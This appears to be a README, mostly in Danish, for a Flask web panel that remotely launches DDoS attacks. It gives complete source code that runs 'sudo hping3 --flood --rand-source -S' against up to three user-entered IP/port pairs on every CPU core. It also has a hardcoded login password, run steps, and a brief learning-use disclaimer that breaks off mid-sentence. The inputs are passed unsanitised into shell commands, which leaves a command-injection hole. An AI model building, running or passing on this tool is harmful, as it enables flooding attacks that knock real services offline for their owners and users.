# ddos-use-kali-linux-on-wed-remote-access
# Flask DDoS Attack Control

This project provides a simple web interface to control a DDoS attack using `hping3` via a Flask application. Users can log in and start or stop an attack by specifying IP addresses, ports, and the duration of the attack.

## Prerequisites

Before running the project, ensure the following are installed on your machine:

- Python 3.x
- Flask (`pip install flask`)
- hping3 (needs to be run with root access)
- Multiprocessing and threading modules (which come with Python)

## Installation

Guide: Sådan får du Flask-appen op at køre

Denne guide viser dig, hvordan du opsætter Flask-appen og kører den på din maskine. Følg trinnene for at få Flask-serveren til at køre korrekt.
1. Installer de nødvendige afhængigheder

Først skal du sørge for, at du har Python og Flask installeret. Hvis du ikke har Flask installeret, kan du gøre det med følgende kommando:

pip install flask

2. Opret en Python-fil til Flask-appen

Opret en fil kaldet app.py på din server, hvor du vil køre Flask-appen.

nano app.py

Indsæt følgende kode i app.py:

from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import subprocess
import threading
import time
import os
import multiprocessing

app = Flask(__name__)
app.secret_key = os.urandom(24)  # Hver gang serveren starter, får den en ny sessionnøgle

# HTML template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Angrebsstyring</title>
    <script>
        function startAttack() {
            const ip1 = document.getElementById('ip1').value;
            const port1 = document.getElementById('port1').value;
            const ip2 = document.getElementById('ip2').value;
            const port2 = document.getElementById('port2').value;
            const ip3 = document.getElementById('ip3').value;
            const port3 = document.getElementById('port3').value;
            const duration = document.getElementById('duration').value;

            // Opret JSON-objekt med data
            const data = {
                ip1: ip1,
                port1: port1,
                ip2: ip2,
                port2: port2,
                ip3: ip3,
                port3: port3,
                duration: duration
            };

            fetch('/start_attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Fejl: ' + error);
            });
        }

        function stopAttack() {
            fetch('/stop_attack', {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
            })
            .catch(error => {
                alert('Fejl: ' + error);
            });
        }
    </script>
</head>
<body>
    <h1>Start DDoS Angreb</h1>
    <label for="ip1">IP1:</label>
    <input type="text" id="ip1" placeholder="Angiv IP Adresse">
    <br><br>
    <label for="port1">Port1:</label>
    <input type="number" id="port1" placeholder="Angiv Port">
    <br><br>

    <label for="ip2">IP2:</label>
    <input type="text" id="ip2" placeholder="Angiv IP Adresse">
    <br><br>
    <label for="port2">Port2:</label>
    <input type="number" id="port2" placeholder="Angiv Port">
    <br><br>

    <label for="ip3">IP3:</label>
    <input type="text" id="ip3" placeholder="Angiv IP Adresse">
    <br><br>
    <label for="port3">Port3:</label>
    <input type="number" id="port3" placeholder="Angiv Port">
    <br><br>

    <label for="duration">Varighed (sekunder):</label>
    <input type="number" id="duration" placeholder="Varighed">
    <br><br>

    <button onclick="startAttack()">Start Angreb</button>
    <button onclick="stopAttack()">Stop Angreb</button>
</body>
</html>
'''

# HTML login template
LOGIN_TEMPLATE = '''
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <h1>Login</h1>
    <form action="/login" method="POST">
        <label for="password">Adgangskode:</label>
        <input type="password" id="password" name="password" required>
        <br><br>
        <button type="submit">Log ind</button>
    </form>
</body>
</html>
'''

# Definer din adgangskode her
PASSWORD = "jrd772zac"

# HTML login route
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            session['logged_in'] = True  # Angiv at brugeren er logget ind
            return redirect(url_for('index'))
        else:
            return "Forkert adgangskode", 403
    return render_template_string(LOGIN_TEMPLATE)

# Funktion til at køre hping3-angrebet med alle CPU-kerner
def start_attack(ip, port, duration):
    # Hent antallet af CPU-kerner
    cpu_cores = multiprocessing.cpu_count()

    # Kommandoen til at bruge alle CPU-kerner
    for _ in range(cpu_cores):
        command = f"sudo hping3 --flood --rand-source -S -p {port} {ip} &"
        subprocess.run(command, shell=True, executable="/bin/bash")

    if duration > 0:
        time.sleep(duration)
        stop_attack_command = "sudo killall hping3"
        subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")

@app.route('/')
def index():
    if not session.get('logged_in'):  # Tjek om brugeren er logget ind
        return redirect(url_for('login'))  # Hvis ikke, send til login-siden
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_attack', methods=['POST'])
def start_attack_route():
    # Modtag data som JSON
    data = request.json
    ip1 = data.get('ip1')
    port1 = data.get('port1')
    ip2 = data.get('ip2')
    port2 = data.get('port2')
    ip3 = data.get('ip3')
    port3 = data.get('port3')
    duration = int(data.get('duration', 0))

    # Tjek, at ip1 og port1 er angivet
    if not ip1 or not port1:
        return jsonify({"status": "error", "message": "IP og port 1 skal angives!"}), 400

    # Start angrebet i separate tråde for hver IP og port
    if ip1 and port1:
        threading.Thread(target=start_attack, args=(ip1, port1, duration)).start()
    if ip2 and port2:
        threading.Thread(target=start_attack, args=(ip2, port2, duration)).start()
    if ip3 and port3:
        threading.Thread(target=start_attack, args=(ip3, port3, duration)).start()

    return jsonify({"status": "success", "message": "Angreb startet!"})

@app.route('/stop_attack', methods=['POST'])
def stop_attack_route():
    # Stop angrebet
    stop_attack_command = "sudo killall hping3"
    subprocess.run(stop_attack_command, shell=True, executable="/bin/bash")
    return jsonify({"status": "success", "message": "Angreb stoppet!"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

3. Kør Flask-appen

Når du har oprettet og gemt app.py-filen, kan du køre Flask-appen med følgende kommando:

python app.py

Dette vil starte serveren på http://0.0.0.0:5000/. Du kan nu tilgå den via din webbrowser.
4. Login og brug af applikationen

    Gå til login-siden via http://localhost:5000/login.
    Brug den definerede adgangskode (jrd772zac) for at logge ind.
    Når du er logget ind, kan du tilgå hovedsiden, hvor du kan starte og stoppe DDoS-angrebet via inputfelterne.

Vigtig Bemærkning

Dette script er til læring og eksperimentering i kontrollerede miljøer. Misbrug af DDoS-angreb kan være ulovligt og kan medføre alvorlige konsekvenser. Sørg for, at
